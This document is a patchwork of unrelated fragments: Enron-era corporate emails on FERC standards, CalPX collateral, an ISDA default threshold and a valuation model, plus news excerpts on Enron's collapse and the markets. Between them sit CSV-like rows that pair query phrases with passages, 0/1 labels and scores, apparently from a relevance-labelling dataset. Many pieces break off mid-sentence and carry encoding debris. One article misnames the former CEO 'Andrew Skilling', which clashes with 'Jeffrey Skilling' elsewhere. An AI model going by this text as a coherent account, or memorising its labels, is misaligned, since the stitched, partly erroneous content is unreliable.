previous cap of 92$/MWh.  The increase, in effect through April 30, 2002,
was implemented as a precaution in case of strong demand in the Pacific
Northwest this winter.  The cap is tied to the region's natural gas market,

new order.

I have some comments, which are attached.  I redlined my changes, and they appear in light blue (there are several red-lined colors in the document).  Many of the changes are editorial, but some are also substantive and are based on our prior position, developed when we were working on legislation, that FERC has to create the SSO.  If we are taking the position in this document that an SSO can be created without FERC, then you may want to delete the references to FERC creating the SSO.  I also included a couple of questions where I thought a statement was unclear.  You may just want to reword the sentence to make it a little clearer.

Let me know if you have any questions.

John and Sarah

In the aftermath of the NERC BOT resolutions last week that wraps in business practices under the NERC purview, we are being asked by Nevius and Gent if we are in support of NERC becoming the SSO.

I have drafted a response that outlines what we need from an SSO.  We are not indicating if we support NERC or GISB/EISB - but are seeking the resolution of key fundamentals of an SSO before we sign on.

Per Jim's request, please take a look at the words and let me know if you have any concerns.  I plan to send this to EPSA so they can borrow some of the language for a letter that the EPSA-NAERO working group agreed to send to NERC.  I also will send it to Dave Nevius under Jose and my signature.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"ALI VELSHI, CNNfn ANCHOR, BUSINESS UNUSUAL: The energy trading giant Enron (URL: http://.www.enron.com/) is restating its earnings downward. This announcement comes less than a month after it said regulators were looking into its off balance sheet deals. Those are deals that push the company to reduce shareholders` equity by more than $1 billion. Fred Katayama has this report. (BEGIN VIDEOTAPE)FRED KATAYAMA, CNNfn CORRESPONDENT (voice-over): Enron delivered another bombshell on a day when Wall Street was anticipating a merger announcement. The tarnished trader of energy drastically restated its earnings to include losses from partnerships now under investigation. Enron is reducing its net income since 1997 by nearly $600 million. The company said it is consolidating the results of a few partnerships that had been left off the balance sheet. Enron would pump assets into a partnership, then have the partnership borrow money so that the debt was kept off of its books. Consolidating the partnerships also boosted Enron`s debt by more than $2.5 billion. RON BARONE, UBS WARBURG: If they lose their investment grade on their debt, the possibility exists that they may have to pay off over $3 billion either in cash or Enron stock. KATAYAMA: Enron fired its treasurer and a lawyer who it believes had invested in a partnership run by its former chief financial officer, Andrew Fastow (ph). The SEC is investigating the two partnerships set up by Fastow. Chairman Kenneth Lay said in a statement, we believe that the information we have made available addresses a number of the concerns that have been raised by our shareholders and the SEC about these matters. ANDRE MEADE, COMMERZBANK SECURITIES: The disclosure probably raises as many questions as it answers and what Enron, what Enron`s trying to do is or what Enron has done. KATAYAMA: Enron stock slumped further and Dynegy (URL: http://www.dynegy.com/) rose on the news. Investors were disappointed because they had hoped Dynegy would announce it would buy its beleaguered rival. (END VIDEOTAPE) KATAYAMA: Now some analysts say uncertainty hangs over any deal. Dynegy will have to recalculate Enron`s worth based on the restated numbers and as for those restated numbers, it may not be the last of those restatements. That`s because, in this current case, today`s disclosure concerned only three entities. Enron has done deals with more than 30 partnerships. Ali. VELSHI: Fred, tell me about these partnerships. Is this common? KATAYAMA: Other companies have these limited partnerships but the difference is the scope of Enron. Say it deals with more than 30 of them. Plus they`re extremely complex. Even Wall Street analysts said they couldn`t figure them out. And you don`t have a chief financial officer of your company running some of these partnerships that are doing business with your company.",1.0,0.5,0.4,0.6

In discussions with Lou and Colleen, we concluded that I would check with Rick Shapiro, Counsel for Legislative Affairs, to address the request.  Alternatively, we can seek assistance from local Florida counsel (e.g. Ann Longman in Tallahassee FL).  

I will let you know what develops soon.

Also, I understand that Rob Wilson is Manager of Regional Governmental Affairs in Tallahassee.  He mentioned that he had a prepared presentation that he had already used.

""Considerations will include, who do you sue, and at what level do you go down?"" said Bruce A. Markell, a professor at University of Nevada, Las Vegas' law school. 
The litigation will also depend upon the extent of liability coverage that Enron executives have under existing insurance policies, according to Markell. 
Enron has said that it holds an $85 million fiduciary policy, which provides for an additional $10 million in defense costs, and a separate liability policy of $350 million for directors and officers. 
Currently, 29 Enron executives - including former Chairman Kenneth Lay, former Chief Executive Andrew Skilling and former Chief Financial Officer Andrew Fastow - have been named in shareholder class-action lawsuits that are before Federal District Court Judge Melinda Harmon in Houston. 
If these suits are amended, which is likely to happen after a lead plaintiff has been named, more defendants could be named. Among the possibilities are former Enron employees Kristina Mordaunt, once an in-house lawyer, as well as Kathy Lynn and Anne Yaeger Patel, both of the finance department. 
The internal report named these three as among those who may have violated Enron's Code of Conduct by receiving compensation from both Enron and an off-balance-sheet partnership. 
Others implicated in the report, including those already the target of shareholder litigation, are Andrew Fastow; Michael Kopper, who once reported to Fastow, and Ben Glisan, current Enron treasurer. 
Also, Ken Lay held ""ultimate responsibility for taking reasonable steps to ensure that the officers reporting to him performed their oversight duties properly,"" according to the internal investigation. ""Ultimately, a large measure of the responsibility rests with the (then-)CEO."" 
Two days after its release, the report is giving some creditors impetus to join the movement to appoint an independent party to manage Enron's bankruptcy case. 
""We believe that having reviewed the special committee's report - as limited as it may be - it is clear that current management and the board, excluding those who joined the company recently, clearly have no business running a publicly traded company,"" said Andrew Entwistle, an attorney for the Florida State Board of Compensation, which lost $334 million in Enron-related investments.

mark to market losses,0,"05/09/2001Dow Jones Commodities Service(Copyright (c) 2001, Dow Jones & Company, Inc.)CHICAGO -(Dow Jones)- Publishers in the North American newsprint market, which are holding large amounts of inventory, continued to resist the recently revised price hike, though prices hadn't suffered further erosion in the week ended Wednesday. Producers reduced their original March price hike of $50 a metric ton to $25 a ton, effective May 1.Market participants said the pressure was on producers to lower prices further. ""We're selling at the same price and buying at the same price,"" said a source at a U.S. merchant, which caters to small- to medium-sized buyers. But added the source, ""I think the ($25 a ton) price increase will get scaled back to unchanged."" The element setting the last few price increases apart from this year's increase is that they were implemented during a tight market. This price hike comes at a time when publishers have considerably reduced their consumption of newsprint and are holding substantial inventory, according to publisher sources. Some of that inventory had been built to beat the March price hike, and it went unused as advertising linage started to fall beyond expectations. ""I've cut orders because my inventories are going up, up and up,"" said a purchasing executive with a major Midwestern daily. ""I'm not buying more than what I have committed under contract."" The executive said other newspaper publishers in the Midwest - Tribune Co. (TRB) as well as some medium-sized buyers - were facing similar circumstances and cutting back on newsprint purchases. The Midwestern daily, whose consumption has fallen 12% mainly due to advertising linage and classified advertising reductions, held 59 days of newsprint inventory, the executive said. Meanwhile, to increase their leverage, some larger publishers turned to purchasing newsprint from entities like Enron Corp. (ENE), while denying business to larger producers like Abitibi-Consolidated Inc. (ABY) and Bowater Inc. (BOW). Enron physically buys and sells pulp and paper, as well as risk-management instruments related to forest products, among other commodities. Transaction prices averaged $620 a ton, but larger newspaper chains paid between $580 a ton to $610 a ton, sources said. Newsprint's list price is currently at $635 a ton. Despite low newsprint consumption and a concerted effort by publishers to stave off the May price increase, BMO Nesbitt Burns Inc.'s forest products analyst, Stephen Atkinson, said the price hike should be implemented ""without any problems."" ""Yes, there is a slowdown (in consumption), but the power is in the hands of the producers"" following a high degree of consolidation in the newsprint industry, he said. ""The producers can't drive publishers into bankruptcy, but the publishers are now finding that they can't drive producers into bankruptcy either,"" Atkinson added.",0.0,0.0,0.7,0.2

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"But first, a recount of what happened. After announcing on October 16, with=out much explanation or transparency, that it has taken a charge of $ 1.2 b=illion against equity, Enron's share price started tumbling. Apparently, th=e charge was the result of some financial transactions, and the SEC launche=d an investigation. The chief financial officer (CFO), who was directly inv=olved with the transactions, the company's treasurer and a couple of other =senior officials were sacked. Perhaps most damagingly, Enron revised its ac=counts from 1997 onwards, reducing profits by about $ 600 million and incre=asing debt by a somewhat similar amount. As a result, Enron's credit rating= was downgraded. It seems the root problem was not in its basic business of= power and gas trading, but in its investment activities controlled by the =CFO. These comprised private equity, and Enron's share in each of the inves=tee companies was kept artificially below 50 per cent to avoid consolidatio=n of accounts. To this end, outside investors were brought in and assured o=f equity in Enron itself, should the value of the investee company(ies) fal=l below agreed threshold(s).=20All this was done to keep the losses in investments off-balance sheet, and =mitigate their impact on reported profits. Many other US corporations inclu=ding J P Morgan Chase, which had large private equity investments, have suf=fered on this score (see World Money October 15). Enron wanted to avoid thi=s and, last year, paid its since-dismissed CFO $ 30 million for his creativ=e accounting genius. Incidentally, those enamoured of US GAAP and its alleg=ed superiority over the rest of the world should note that all these gimmic=ks were blessed by the company's auditors - one of the Big Five firms, whic=h was paid $ 25 million as audit fees and $ 27 million for other services b=y Enron last year. The restatement of the accounts from 1997 onwards became= necessary as the Enron management/board and the auditors were forced, on r=eview, to admit that at least some of the transactions should have been on,= rather than off, balance sheet. Details of all the transactions in questio=n are yet to come out, but what has come out is bad enough.=20But this apart, a billion dollar hit for a company of the size ($ 300 billi=on) or cash flow ($ 3 billion) of Enron is, by itself, hardly a death warra=nt. But it turned out to be just that for Enron. Perhaps because it was too= arrogant? Perhaps also because its accounts lacked transparency and their =opaqueness ensured that investors' confidence was always somewhat fragile? =But there are two other points worth noting: the professionalism of equity =analysts and whether the event restores somewhat the balance between tradin=g and producing. As for the first, the professional analysts were surely aw=are of the opaqueness of the accounts, but few questioned the management ag=gressively on the subject.=20",0.8,0.5,0.9,0.8

     Washington, Feb. 4 (Bloomberg) -- A House subcommittee chairman says he'll subpoena Former Enron Corp. chairman Kenneth Lay to force him to testify tomorrow.
     Former Enron Chief Executive Officer Jeffrey Skilling intends to keep his Thursday appointment with a House committee and he'll answer questions, his spokeswoman Judy Leon said.
     Lay canceled scheduled testimony today and tomorrow, a move his lawyer blamed on lawmakers' ""inflammatory'' comments following the release of an internal company investigation.
     The 203-page review concluded Enron executives enriched themselves while hiding at least $1 billion in losses in 3,000 partnerships, steps that led to the biggest bankruptcy filing in U.S. history. The study was commissioned by Enron's board and led by University of Texas Law School Dean William Powers.
     Powers is scheduled to testify before the House Financial Services subcommittee this afternoon, along with Securities and Exchange Commission Chairman Harvey Pitt.
     Lay was scheduled to testify before the same panel tomorrow and before the Senate Commerce Committee today. Representative Richard Baker, a Louisiana Republican who chairs the House Financial Services Capital Markets Subcommittee, will subpoena Lay to make him testify tomorrow, Baker's spokesman Michael DiResto said.

'Culture of Corruption'

     Democratic Senator Byron Dorgan, who was in charge of the Senate hearing, told NBC yesterday that the Powers report shows ""a culture of corporate corruption.'' Dorgan said Lay used reaction to the report to avoid appearing before Congress.
     Republican Senator Peter Fizgerald, a panel member, said the report depicts ``a giant pyramid scheme.'' House Energy and Commerce Committee chairman Billy Tauzin spoke of ``security fraud'' on NBC's ``Today'' show.
     ``These inflammatory statements show that judgments have been reached and the tenor of the hearing will be prosecutorial,'' Lay's attorney, Earl J. Silbert, said in a letter to the Senate Commerce Committee.
     Former Enron Chief Financial Officer Andrew Fastow, who the company said earned $30 million from buying and selling company property and assets, is scheduled to appear with Skilling Thursday before the House Energy and Commerce committee. His spokesman refused to comment on any aspect of Fastow's scheduled appearance.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"11/29/2001Dow Jones Capital Markets Report(Copyright (c) 2001, Dow Jones & Company, Inc.)NEW YORK -(Dow Jones)- As the clock ticks on Enron Corp.'s (ENE) potential bankruptcy filing, derivatives dealers are bracing for perhaps one of the biggest unwindings ever of positions in the over-the-counter market. Proposals are already being floated over how dealers and other counterparties to contracts with Enron will go about determining the value - or replacement costs - of those contracts should Enron file for bankruptcy protection. Replacement costs are used to net out what counterparties owe to each other in the event of a default or termination event.A blizzard of paperwork for dealers and other counterparties would likely follow an Enron bankruptcy. That's because standard derivatives contracts generally call for counterparties to canvass four dealers for a replacement quotation and then take an average of those quotes. Dealers are expecting the quotes to swing wildly should Enron's derivatives contracts be terminated because of a bankruptcy. And ironing out the market quotes could take weeks or even months, according to one market participant. Enron, a major player in commodity and energy-related derivatives, among others, had derivatives trading liabilities to third parties of around $18.7 billion as of Sept. 30, according to Swaps Monitor in New York, which tracks the global over-the-counter derivatives market. The Houston-based energy and trading firm's liabilities are similar to replacement costs for Bank of America (BAC) and Barclays, two financial firms with higher credit ratings and greater financial resources. While Enron's relate almost entirely to energy derivatives, those of Bank of America and Barclays arise mainly from interest rate and currency derivatives, Swaps Monitor says. There's been some big fallouts in the derivatives markets over the years, though observers say Enron's could be among the most complex. The derivatives market's first liquidation of size followed the 1990 bankruptcy filing of Drexel Burnham Lambert, the securities firm known for its high-yield dominance. Swaps Monitor estimates that Drexel's interest rate derivatives book at the time was in the range of $25 billion to $30 billion on a notional or face value basis. But at the time of its bankruptcy, Drexel owed its counterparties no more than ""a few hundred million dollars on its derivatives contracts,"" Swaps Monitor says. The collapse of Barings Bank in January of 1995 stemmed from positions in exchange-traded derivatives and the bank didn't have a meaningful presence in the over-the-counter market. Even so, OTC market participants took note and instituted greater oversight within their OTC operations. The Asian financial crisis led to the demise of several firms including Peregrine Fixed Income. Replacement costs relating to Peregrine were far smaller than what's expected if Enron's derivatives were to face an early termination event.",0.0,0.0,0.8,0.0

mark to market losses,0,"Key indexes finished mixed Tuesday but more stocks rose than fell as Wall Street struggled for direction ahead of the Federal Reserve's meeting next week. In the bond market short-term yields fell further, and long-term yields inched up after the government's disappointing report on first-quarter worker productivity.The Dow Jones industrials eased 51.66 points, or 0.5%, to 10,883.51, the fourth loss in five sessions, as the 11,000 mark again proves to be a barrier for the blue-chip index. But the Nasdaq composite index rose 25.20 points, or 1.2%, to 2,198.77 as semiconductor and computer networking stocks rose ahead of Cisco Systems' quarterly earnings report, released after regular trading ended. Cisco's operating results slightly beat estimates, but the company reported a massive net loss as it wrote down the value of excess inventory. Cisco shares, which rallied $1.13 to $20.38 in regular trading, fell to $19.90 in after-hours activity. In the broad market Tuesday, winners edged losers by 21 to 17 on Nasdaq and by 16 to 14 on the New York Stock Exchange. Trading volume was moderate. Some analysts were impressed by the market's strength, especially in the wake of the downbeat productivity report. The government said worker productivity fell at a 0.1% rate in the first quarter, the first decline in five years. The report, though not entirely unexpected, raised fears about inflationary pressures in the economy. Productivity gains had helped hold inflation to a minimum in the late 1990s. Long-term Treasury bond yields rose modestly Tuesday as traders registered their concern about inflation's trend. The 10-year T-note yield ended at 5.24%, up from 5.19% Monday. But shorter-term yields continued to slide as traders bet that the Fed, which meets Tuesday, will cut its key short-term lending rate for a fifth time this year. The six-month T-bill yield slid to a new two-year low of 3.69% from 3.72% Monday. Though the central bank may lower short-term rates further, the productivity report ""increases the likelihood that the Fed will have to reverse course next year,"" raising rates to contain inflation, Henry Willmore, chief U.S. economist at Barclays Capital, told Bloomberg News.

I just received a call from GE (Jeff Darst and Steve Swift) in which they said that NorthWestern was asking for GE to sign documents that would enable NorthWestern to buy out Enron remaining interest in the LLC.

Subject:	RE: CalPX Collateral Issue

This is a quick note to let the team know that I do have the credit worthiness requirements for PX (FERC Electric Service Tariff, Art. 2.4); a summary could be prepared if needed.   I trust that the Team would benefit from a legal opinion on Art. 2.4.5, and the associated schedule 2 of the tariff  related to ""Changes in the Amount of Security Provided by a PX Participant""  which allows a refund of securities above the PX security Amount.  As Steve mentioned nicely below, if the security amount is zero, then perhaps there is an argument for a full refund.

On the same theme, I am investigating  the requirements for maintaining ESP (electricity service provider) in California.  One of the conditions is that the ESP is eligible as a participant in the CA ISO.  If the CA ISO also necessitates participant status in the PX for  some transactions, then there is a circular flow in the argument, and may be there is a need to maintain a form of relationship with the PX.

I shall keep you posted with progress.

Subject:	CalPX Collateral Issue

Thanks Steve.  With your input, my take on Elizabeth's questions are:

1.	Must we renew the collateral?-  From a legal standpoint the answer is ""No"" for the reasons discussed below.  However, as we know, the PX will take a contrary position and has (along with other California parties) taken the position at FERC that the collateral should be withheld pending resolution of the CA refund case at FERC (to secure payment of refunds due).

2.	May we replace the letters of credit with cash / other collateral?-  The answer is ""Yes"" as you note below, with the caveat that the replacement collateral must be acceptable to the PX.  Obviously cash should be acceptable.  Perhaps a bond or negotiable instrument could be an option.

3.	What is the potential outcome if we do nothing (i.e. we don't re-up the letters of credit).  Our past experience in this regard has been that the PX will draw on the letter of credit prior to its expiration.

As for additional options, we could consider:

1. 	Further to Steve's option 1, we might try to enforce the return of the excess in court by submitting a Section 2.5 request to the PX and bringing the issue to a head.  Steve's original option is pref",0.0,0.0,0.7,0.0

defined, the Indicated Shippers demanded in calling for all full-requirements contracts to be converted
to contract demand contracts, echoing a similar assertion made in a July 13 complaint by a group of
CD shippers (RP01-484).

Otherwise, full-requirements shippers will enjoy unlimited use of capacity at the expense of other
customers, the Indicated Shippers continued. ""The absurdity of the claim is demonstrated by analogy to a
request that an airplane be built to carry all customers who might request service on a particular day,
without requiring the customers to make a reservation,"" they said.

The ""entire ability"" of El Paso to handle increased volumes systemwide was questioned earlier this
summer by Commissioner Pat Wood III in a June 27 discussion prior to the Redhawk vote (IF, 2 July, 4). El
Paso was directed to relate in its order 637 proceeding (RP00-336) how well upstream capacity can handle
new load on the system. El Paso committed in a July 9 letter to serve full-requirements customers ""while
satisfying"" obligations to California customers.

On days of short supply, shippers using primary points are scheduled ahead of those using alternate
points and interruptible shippers, El Paso went on to say. If firm shippers using primary points exceed
available capacity, then volumes are allocated on a pro-rata basis. El Paso also reiterated its plans to use
the capacity from the conversion of the All American Pipeline L.P. to serve existing customers.

Beyond requesting the information in the order 637 proceeding, FERC should take another step to
consider ""the totality of circumstances on the El Paso system"" and reopen the pipeline's rates under section
5 of the Natural Gas Act, Southern California Edison Co. asserted. The increased load by full-requirements
shippers caused problems in flowing contracted quantities on El Paso, SoCal Ed contended.

Full-requirements and contract demand shippers pay for service differently, SoCal Ed continued. While
CD shippers pay demand charges for all their volumes, full-requirements shippers pay charges based on
total billing determinants of 766,659 Dt/day. When FR customers use more than that, El Paso is unable to
honor firm commitments and the customers ""enjoy a free ride at the expense of California consumers,"" the.utility complained.

Oneok Energy Marketing and Trading Co. L.P. registered a similar concern, contending that the pro-rata
allocation methodology favors FR customers. ""Full-requir",0.0,0.0,0.7,0.2

PSC approves 'multiple overlay' for '678' area code

The Public Service Commission yesterday approved a ""multiple overlay""
plan to relieve NXX code exhaustion in the ""678"" number planning area
(NPA), a commission staff member told TR.  A new area code will overlay
the 678 NPA, which is already an overlay for the ""404"" and ""770"" area
codes.

The relief plan will allow existing customers to keep the 678 area code
and will continue to require 10-digit dialing.  When the 678 NPA is
exhausted, code assignments will be made in the new overlay area code.
The 678 NPA has enough codes to last through August, and the new area
code is scheduled to take effect Aug. 7.  In addition, the remaining
codes in the 404 NPA will continue to be available until they are
exhausted.  (Docket no. 10448-U)

What motivated it to start down a path that ultimat=ely led to its demise?=20In 1991, soon after he joined Enron from Continental Bank in Chicago, Mr. F=astow worked with a group of Wall Street firms to put together a deal, know=n as Cactus 1, in which interests in natural gas reserves would be packaged= and sold to public investors.

Rather than packaging t=he energy assets for purchase by the public, Mr. Fastow constructed a compl=ex partnership deal for private investors, including the General Electric C=redit Corporation and a consortium of banks.=20In describing that transaction in the deposition, Mr. Fastow explained the =benefits it brought to Enron -- in particular how it allowed the company to= maintain the high credit rating necessary to carry out its business strate=gy.

Dear Dr. Kaminski

My name is Jaesoo Lew and I am referred by Dr. Wayne Lee.

Currently I've been working at Aquila Energy in Kansas City as an pricing
analyst since July 2000.  Since then, I have developed a natural gas storage
valuation model applying the swing options (forest method) pricing approach.
The price processes would be considered critical for the storage valuation
since a trinomial forest is required to value storage. Also the c++
programming using Excel DLL has been developed, too.

I attached my resume to this message for your consideration and am looking
forward to talking about an opportunity at Enron.

this week as Dr. Lee informed me.  If possible, please let me know your
expected calling day through the mail.  I appreciate your consideration.

Thank you very much.

Sincerely,

Jaesoo Lew

mark to market losses,0,"Major stock indexes gave up early gains and closed moderately lower Tuesday as poor earnings reports weighed on investors, prompting them to again cash in recent profits. Throughout the day, investors were torn between their newfound optimism about earnings and the economy and fears that it will be much longer before the business environment improves.The Dow Jones industrial average lost 77.89 points, or 0.7%, to close at 10,454.34. Investors became more cautious as the session progressed, pulling back after sending the Dow up as much as 106.83 points earlier. Wall Street's broader indicators also finished lower. The Nasdaq composite index fell 42.71 points, or 2.1%, to 2,016.61, but it is still up 23% from its low for the year of 1,638.80, reached April 4. The Standard & Poor's 500 index fell 14.89 points, or 1.2%, to 1,209.47. The loss put the S&P 500 back into bear market territory, defined as a loss of 20% or more from a recent peak. Despite the declines in the indexes, the overall picture was less bleak. Advancing stocks actually led declining issues by a razor thin margin on the New York Stock Exchange, while decliners led advancers by a 10-9 margin on the Nasdaq Stock Market. Trading was active on both markets. Analysts expected the market to pull back after last week's big rally, which saw the Dow gain 452 points and Nasdaq pick up 201. ""We did make a pretty giant leap. I think we are just consolidating,"" said Steven Goldman, market strategist for Weeden & Co. He and other analysts also said the profit taking had little to do with a report by the Conference Board that consumer confidence dropped significantly in April. Investors believe the decline should give the Federal Reserve greater incentive to lower interest rates for the fifth time this year when its policymaking Open Market Committee meets in mid-May. Wall Street, which last week ended its two best weeks of the year on positive earnings news and an unexpected rate cut by the Fed, is having conflicted emotions about the economy--while hoping that business and earnings will turn around soon, investors also are fearful that a recovery could take much longer. ""Fed rate cuts are pluses for the economy, but they take time to work their way through the system,"" said Alan Ackerman, executive vice president of Fahnestock & Co. Investors sold companies that posted disappointing profits. Consumer products maker Kimberly-Clark plunged $6.17 to close at $56.61 on news it missed earnings expectations by a penny a share. JDS Uniphase tumbled $3.36 to $20.82 after announcing it would restructure its business, laying off 20% of its work force and closing several operations. Although earnings for its fiscal third quarter met forecasts, the company said it anticipates fourth-quarter profit to be 5 cents a share, 7 cents shy of expectations.

record keeping accounting practices,0,"In a speech at the American Enterprise Institute, Bolkestein reaffirmed theEuropean Union's commitment to requiring all E.U.-based companies to use theInternational Accounting Standards (IAS) practices in their record keepingin order to enhance transparency and provide higher quality financialinformation to investors across the world.""The use of one global accounting language will greatly benefit Europeancompanies. It will help them compete on equal terms for global capital,""Bolkestein said. He added that the legislation would require companies tobegin preparing their consolidated accounts using IAS by 2005.Bolkestein also said he is hopeful that the U.S. Securities and ExchangeCommission will begin to accept financial statements prepared by firms inthe European Union without requiring them to be reconciled with thegenerally accepted accounting principles (GAAP) standard used in the UnitedStates.A major reason that changes are needed in the European Union's financialregulations is because of the ""unprecedented volume of mergers andacquisitions"" between American and European firms.Another reason is that the European Union has established a goal of becoming""the most competitive and dynamic knowledge-based economy in the world,capable of sustainable growth with more and better jobs, and greater socialcohesion,"" Bolkestein said.Since 1990, Bolkestein said the European community has added 900,000 jobsand has seen improved competition and productivity add 1.5 percent to grossdomestic product growth because of measures taken to create a single marketfor financial services.If the European Union is successful at restructuring its financial system by2005, Bolkestein said he sees other benefits to include a lower cost ofcapital for all companies, a deeper and more vibrant venture capital market,lower costs of purchasing financial products, and higher returns on pensionsand investment funds.To realize those benefits, Bolkestein said the European Commission wouldlike to see an integrated securities market in place by 2003, replacing theindividual domestic securities markets of the European Union's 15 memberstates.""Mergers and alliances between existing exchanges are already breaking downbarriers, pooling liquidity, reducing clearing costs, decreasing volatility,and increasing transparency,"" Bolkestein said. He added that Europe is alsoseeing ""a marked increase in the number of on-line brokerage accounts, whichfurther contributes to efficiency and transparency,"" but also creates agreater need for changes in the way the European Union regulates itsfinancial sector.Top securities lawyer set to head SECFinancial Times - May 11, 2001By John LabatePresident George W.

There is no specific policy on this E of D to my knowledge because it was 
specially added for Japan to produce an early credit-related event of 
default.  Because the monetary figure could cut against Enron Japan, I would 
suggest that we go with a figure that is material enough as applied against 
our counterparty, but which if applied to EJ would not easily trigger a 
default against EJ, let's say USD 1 million or a higher figure.

You will see that we need to include a figure in clause 6(a)(1): Additional 
Events of Default - Other Financial Crises.  They proposed JPY1,000,000,000 
(US$10 million), I counterproposed JPY1,000,000 (US$10,000).  They are now 
suggesting JPY100,000,000 (US$1,000,000).  

I am thinking of suggesting US$500,000 (JPY50,000,000).  Are there any Enron 
policies etc in this regard? What is the typical range of acceptability for 
Enron on this? Any other comments?

Dear Ms. McBride,

Thank you for your e-mail.
It is our opinion that the amended clause 5 (c) is acceptable for our
client, ToaRe. We are also informed by Mr. Ono that they will accept such
clause.

As to the other issue, JPY1,000,000 is all too low. JPY1,000,000 equals to
only about 10,000 US$. If JPY1,000,000,000 is not acceptable for you, how
about JPY100,000,000?

RANDOM,0,"uke, Dynergy and Mirant charged less than the 
average prices paid by the state during the first three months of the year. 
California government utilities, on the other hand, such as the Los Angeles 
Department of Water and Power and the Sacramento Municipal Utility District 
(SMUD), charged the state much more for electricity than the out-of-state 
generators. For example, while Texas-based Enron, a favorite Davis whipping 
boy, charged an average $181 per megawatt hour, SMUD charged an average $330 
per megawatt hour. 
Davis responded to this revelation in typical political fashion. A Davis 
spokesman said that the governor had expressed his anger at ""the generators 
who wear cowboy hats"" and that ""just because there are other entities that 
are charging us more doesn't change the fact that we are getting ripped off 
by companies from Houston, Tulsa, Atlanta or Charlotte."" 
Yet, for all Davis' feigned indignation about consumers being ripped off, it 
turns out that he and his regulators are poised to ensure that business 
consumers are ripped off by state government. Davis has signed $43 billion in 
ill-advised long-term purchase contracts at rates above-market-price. The 
state must, therefore, ensure that enough business customers remain in the 
current state-controlled distribution system to pay for high-priced state 
power purchases. This is especially important to Davis since the high prices 
are borne disproportionately by business. Thus, Davis' regulators are set to 
eliminate ""direct access,"" which allows businesses to shop for cheaper power. 
Who's the real gouger? No matter how much Davis points the finger, 
Californians are paying dearly for his political opportunism and bad 
policies. ",0.0,0.0,0.8,0.6

Subject: spread option model



Please see attached summary sheet.  The intrinsic value is the value of the basin spread, and the extrinsic is the volatility (time) value.  The correlation being assumed minimizes extrinsic value, so we are only looking at the value of the spread from 2006 onward.

Results are that the basin curves impley over $2bb in continuing value past '06.  Assuming $550 in debt, that provides a PV equity value of $1.45bb.  Add to that the PV of the current contracts, approx $400mm, and you've got a total equity value of approximately $1.85bb.  This is reasonably consistent with the model if we adjust it to include max rates (as the basin curve valuation suggests you should do).

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Enron shares tripled in the two years ended December 2000,peaking at a market value of more than $70 billion, as the companysnared $16.1 billion in long-term energy management contracts fromcompanies such as International Business Machines Corp. andStarwood Hotels & Resorts Worldwide Inc. In the first quarter of2001, Enron's profit from operations rose 20 percent to $406million and revenue quadrupled to $50 billion. Enron began to unravel in October after it said shareholdersequity was reduced by $1.2 billion because it used stock to payoff debt of a partnership run by then Chief Financial OfficerAndrew Fastow. The announcement led to lawsuits and a probe by theSecurities and Exchange Commission. The writedown also raisedquestions about how Enron accounted for debt and losses of similaraffiliated partnerships. On Nov. 8, it restated earnings back to1997, lowering them by $580 million. As its shares plunged, Enron faced a cash crunch becauselenders and some trading partners lost confidence the companywould have the cash to pay bills. Citigroup and J.P. Morgan Chaseoffered to pony up $250 million each out $2 billion the companysought. Trading partners such as Mirant Corp. were lessforgiving, demanding more collateral or restricting trading. EnronOnline, Enron Corp.'s online trading system, stoppedallowing trades and quit posting bids and offers for natural gasthis morning, say traders who use the Web site. Enron saidyesterday that EnronOnline handled about 60 percent of its tradingbusiness, or about $2.8 billion a day. ``We can log in, but there is nothing there, nothing to buyand nothing to sell,'' said Juha Laiho, an energy trader atFinland-based Fortum Oyj in Houston. ``It went down some time thismorning.'' Lower Credit Ratings S&P cut its rating on Enron to ``B-'' from ``BBB-'' andMoody's lowered its rating to ``B2'' from ``Baa3.'' Both ratingsare below investment grade. The downgrade is significant becausethe reduction to junk may require Enron to repay $3.9 billion. Andre Meade, an analyst at Commerzbank Securities, said thatEnron's junk credit rating would ``effectively shut down the bulkof their trading and marketing operations.'' ``It's not likely Enron will be able to raise the capital tosettle those payments and continue its business,'' said Meade. The large debts make it unlikely that investors will receivemuch should the company file for bankruptcy, said investors. ``This will be a traditional bankruptcy in which equityholders get nothing,'' said Edward Paik, who has 1.6 million Enronshares among $7 billion in assets he helps manage for LibertyFunds Group. ``This company doesn't have the safety net in termsof assets that other companies do.''Enron's Ratings Cut to Junk by S&P, Moody's, Fitch (Update6)2001-11-28 16:51 (New York)Enron's Ratings Cut to Junk by S&P, Moody's, Fitch (Update6)",0.0,0.0,0.9,0.8

record keeping accounting practices,1,"f which were designed 70 years ago, are difficult to apply to today's compl=ex financial transactions. And there is no way, they insist, to prevent sop=histicated fraud. The American Institute of Certified Public Accountants (A=ICPA), the industry's professional association, points out that accountants= examine the books of more than 15,000 public companies every year; they ar=e accused of errors in just 0.1% of those audits. But oh, the price of thos=e few failures. Lynn Turner, former chief accountant of the Securities and =Exchange Commission, estimates that investors have lost more than $100 bill=ion because of financial fraud and the accompanying earnings restatements s=ince 1995.=20Perhaps the most glaring example of self-regulation's deficiency has been a=ccountants' unwillingness to deal with conflicts of interest. Over the year=s, the major auditing firms have transformed themselves into ""professional =services"" companies that derive an increasing portion of revenues and profi=ts from consulting: selling computer systems, advising clients on tax shelt=ers, and evaluating their business strategies. In 1999, according to the SE=C, half of the Big Five's revenues came from consulting fees, vs. 13% in 19=81.=20Auditing, meanwhile, has become a commodity. Firms have even been accused o=f using it as a loss leader, a way of getting in the door at a company to s=ell more-profitable consulting contracts. ""Audit work is a marvelous market=ing tool,"" says Lou Lowenstein, a professor emeritus of finance and law at =Columbia University. ""You are already there doing the audit. You say their =internal controls are no good. Well, who are they going to call to fix it?""= But this requires a firm to work for the public (auditing) and management =(consulting). ""You cannot serve them both,"" says former SEC commissioner Be=vis Longstreth.=20This conflict may have played a role at Enron. Andersen received $25 millio=n in auditing fees from Enron last year. That's money Andersen was paid bot=h as Enron's outside auditor, certifying its financial statements, and as i=ts internal auditor, making sure Enron had the right systems to keep its bo=oks and working to detect fraud and irregularities. This double duty alone =raised a serious potential for conflict. Besides $25 million in accounting =fees, Andersen was paid $23 million for consulting services. ""If you are au=diting your own creations, it is very difficult to criticize them,"" says Ro=bert Willens, a Lehman Brothers tax expert who disapproves of the accountin=g profession's recent move into selling aggressive tax shelters. Andersen h=as not revealed the details of its work on Enron's highly controversial off=-balance-sheet 